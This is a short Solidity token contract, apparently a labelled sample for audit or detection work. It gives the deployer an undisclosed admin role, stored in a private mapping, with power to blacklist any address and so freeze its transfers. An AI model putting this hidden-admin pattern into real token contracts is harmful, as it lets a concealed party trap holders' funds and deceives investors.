// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/// Hidden privileged role via a private map — not a visible owner, not documented.
contract HiddenAdminToken {
    mapping(address => bool) private _admins;
    mapping(address => bool) public blacklist;
    mapping(address => uint256) public balanceOf;

    modifier onlyAdmin() {
        require(_admins[msg.sender]);
        _;
    }

    constructor() {
        _admins[msg.sender] = true;
        balanceOf[msg.sender] = 1e24;
    }

    function setBlacklist(address account, bool blocked) external onlyAdmin {
        blacklist[account] = blocked;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(!blacklist[msg.sender] && !blacklist[to]);
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}
